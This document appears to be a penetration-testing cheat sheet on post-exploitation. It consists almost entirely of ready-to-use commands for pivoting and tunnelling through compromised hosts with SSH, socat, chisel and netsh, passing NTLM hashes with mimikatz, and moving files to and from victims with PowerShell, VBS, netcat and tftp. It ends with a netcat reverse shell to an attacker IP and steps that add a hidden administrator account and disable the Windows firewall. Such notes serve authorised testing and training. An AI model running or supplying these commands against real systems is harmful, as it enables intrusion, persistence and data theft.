# Post Exploitation
* [Local Port forwarding](#Local-Port-forwarding)
* [Remote port forwarding](#Remote-port-forwarding)
* [Socks Proxy](#Socks-Proxy)
  * [Configuring proxychains](#Configuring-proxychains)
  * [Using proxychains](#Using-proxychains)
* [Other tunneling options](#Other-tunneling-options)
* [File Transfers](#File-transfers)
* [Misc](#Misc)

## Local Port forwarding
#### SSH
- Will connect local port to target port on target IP. 
- Usefull for example when database server is running on localhost on target and you want to connect to it on your kali.
```
ssh -N -L <LOCAL PORT>:127.0.0.1:<TARGET PORT> <USERNAME>@<TARGET IP>
```

#### SSH over hop
- Will open local port on your kali (BIND_ADDRESS) and connect it to target port and IP over a HOP.
- Usefull for example when you owned 1 host that can connect to another host that is running mssql and you want to connect from your kali to that mssql service.
```
ssh -N -L <BIND_ADDRESS>:<LOCAL PORT>:<TARGET IP>:<TARGET PORT> <USERNAME>@<HOP IP>
```

### Netsh Windows
- Open a port on locap port and IP and send all traffic to target IP and port.
- Usefull for opening a port on the hop for receiving shells backs.
- Usefull for example when you owned 1 host that can connect to another host that is running mssql and you want to connect from your kali to that mssql service.
```
netsh interface portproxy add v4tov4 listenaddress=<LOCCAL IP> listenport=<LOCAL PORT> connectaddress=<TARGET IP> connectport=<TARGET PORT> protocol=tcp
```

#### List forwards
```
netsh interface portproxy show v4tov4
```

#### Remove port forward
```
netsh interface portproxy delete v4tov4 listenaddress=<IP> listenport=<PORT>
```

### Socat Windows
- https://netcologne.dl.sourceforge.net/project/unix-utils/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip
- Download all dll's and executable on target
- Open a port on locap port and IP and send all traffic to target IP and port.
- Usefull for opening a port on the hop for receiving shells backs.
- Usefull for example when you owned 1 host that can connect to another host that is running mssql and you want to connect from your kali to that mssql service.
```
socat.exe tcp-listen:<LISTENING PORT>,fork tcp-connect:<TARGET IP>:<TARGET PORT>
```

#### Then let it listen on our kali machine 
- so we can connect with our windows tools for example
```
socat tcp-l:<LISTENING PORT>,fork tcp:<TARGET IP TO SEND IT TO (FIRST HOP)>:<TARGET PORT>
```

## Remote port forwarding
- Forward local port of target back to our kali

#### SSH
- Will connect local port back to our kali. 
- Usefull for example when database server is running on localhost on target and you want to connect to it on your kali.
```
ssh -N -R <BIND_ADRESS>:<PORT>:127.0.0.1:<TARGET PORT> <USERNAME>@<ATTACKER IP>
```

#### Plink.exe
```
plink.exe <USER>@<IP> -R <ATTACKER PORT>:<TARGET IP>:<TARGET PORT>
```

## Sockx proxy
### Configuring proxychains
#### SSH
```
sudo ssh -N -D 127.0.0.1:9000 <username>@<IP>
```

#### SSH over hop
```
ssh -J <USER>@<FIRST HOP IP> -D 127.0.0.1:9000 <USER>@<SECOND IP>
```

#### Chisel
- https://github.com/jpillora/chisel
```
/opt/chisel/chisel server -p 443 --socks5 --reverse
./chisel.exe client <ATTACKER IP>:443 R:socks
```

### Using proxychains
#### Proxychains
- For linux
- Change proxychains config `socks5 <IP> <PORT> <USER> <PASS>`
```
sudo vim /etc/proxychains.conf
proxychains <COMMAND>
```

#### Proxifier
- https://www.proxifier.com/
- For windows
- Open Proxifier, go to Profile -> Proxy Servers and Add a new proxy entry, which will point at the IP address and Port of your Cobalt Strike SOCKS proxy.
- Next, go to Profile -> Proxification Rules. This is where you can add rules that tell Proxifier when and where to proxy specific applications. Multiple applications can be added to the same rule, but in this example, I'm creating a single rule for adexplorer64.exe (part of the Sysinternals Suite).
- Target hosts fill in the target internal network range with the action ```proxy socks <TARGET>```
- NOTE: You will also need to add a static host entry in `C:\Windows\System32\drivers\etc\hosts` file: `<DC IP> <DOMAIN>`. You can enable DNS lookups through Proxifier, but that will cause DNS leaks from your computer into the target environment.

#### Proxychains netonly or overpass the hash
```
runas /netonly /user:<DOMAIN>\<USER> "C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:"C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"
```

#### Browser
- Install FoxyProxy https://getfoxyproxy.org/
- Configure Proxy IP and port, Username and Password.
- NTLM auth: https://offensivedefence.co.uk/posts/ntlm-auth-firefox/

## Other tunneling options
#### sshuttle
```
sshuttle -r <USERNAME>@<TARGET> <RANGE(s) TO TUNNEL> --ssh-cmd 'ssh -i /home/user/Offshore/id_rsa_root_nix01'
sshuttle -r <USERNAME>@<TARGET> <RANGE(s) TO TUNNEL>
```

## File transfers
### Download files
#### Start webservers
```
sudo service apache2 start #files in /var/www/html
sudo python3 -m http.server <PORT> #files in current 
sudo python2 -m SimpleHTTPServer <PORT>
sudo php -S 0.0.0.0:<PORT>
sudo ruby -run -e httpd . -p <PORT>
sudo busybox httpd -f -p <PORT>
```

#### Download file from webserver
```
wget http://<IP>:<PORT>/<FILE>
```

#### SMB Server
```
sudo python3 /opt/oscp/impacket/examples/smbserver.py <SHARE NAME> <PATH>
```

#### Look for files in SMB
```
dir \\<IP>\<SHARE NAME>
```

#### Copy files from SMB
```
copy \\<IP>\<SHARE NAME>\<FILE NAME> <FILE>
```

#### Copy all files
```
copy \\<IP>\<SHARE NAME>\<FILE NAME>\*.* .
```

#### Copy files to SMB
```
copy <FILE> \\<IP>\<SHARE NAME>\<FILE NAME>
```

#### Linux ftp
```
If installed use the ftp package
```

#### Windows ftp
Use native program with the -s parameter to use a input file for the commands
```
echo open 192.168.119.124 21> ftp.txt
echo USER offsec>> ftp.txt
echo lab>> ftp.txt
echo bin >> ftp.txt
echo GET accesschk.exe >> ftp.txt
echo GET winPEASany.exe >> ftp.txt
echo quit >> ftp.txt

ftp -v -n -s:ftp.txt
```

#### Setup FTP server
```
python -m pyftpdlib 21
```

#### Connect to ftp server
```
ftp <IP>
```

#### VBS download files for Windows XP
Create vbs script
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

Run VBS script to download file
```
cscript wget.vbs http://<IP>/<FILE> <FILE>
```

#### Powershell download file
```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/<FILE>', '<FILE>')
```
```
powershell -c "Invoke-WebRequest -Uri 'http://<IP>/<FILE>' -OutFile 'C:\Windows\Temp\<FILE>'"
```

### Upload files
#### Netcat listener for file
```
nc -nlvp <PORT> > <FILE>
```

#### Netcat send file
```
nc -nv <IP> <PORT> <FILE>
```

#### Socat listener for file to send
```
sudo socat TCP4-LISTEN:<PORT>,fork file:<FILE>
```

#### Socat get file
```
socat TCP4:<IP>:<PORT> file:<FILE>,create
```

#### Powercat send file
```
powercat -c <IP> -p <PORT> -i <FILE>
```

#### Upload Windows data through HTTP Post request
make /var/www/upload.php on kali
```
<?php
$uploaddir = '/var/www/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

Upload file in Windows client
```
powershell (New-Object System.Net.WebClient).UploadFile('http://<IP>/upload.php', '<FILE>')
```

#### Upload through tftp (over udp)
Install tftp on kali
```
sudo apt update && sudo apt install atftp
sudo mkdir /tftp
sudo chown nobody: /tftp
sudo atftpd --daemon --port 69 /tftp
```

On windows client to send file
```
tftp -i <IP> put important.docx
```

#### Powercat send file
```
powercat -c <IP> -p <PORT> -i <FILE>
```

## Misc
#### PSExec
Shell back to my machine with other user using netcat 
```
PsExec.exe -u <COMPUTERNAME>\<USERNAME> -p <PASSWORD> \\<COMPUTERNAME> nc.exe <ATTACKER IP> <ATTACKER PORT> -e cmd.exe
```

#### Enable RDP and create user to login
```
#Enable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

#Enable more then 1 user login
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f

#Add user to RDP group
net user <USER> <PASS> /add /Y
net localgroup administrators <USER> /add
net localgroup "Remote Desktop Users" <USER> /add

#Disable firewall
netsh advfirewall set allprofiles state off

#RDP to machine
xfreerdp /u:<USER> /p:<PASS> /v:<TARGET>
```
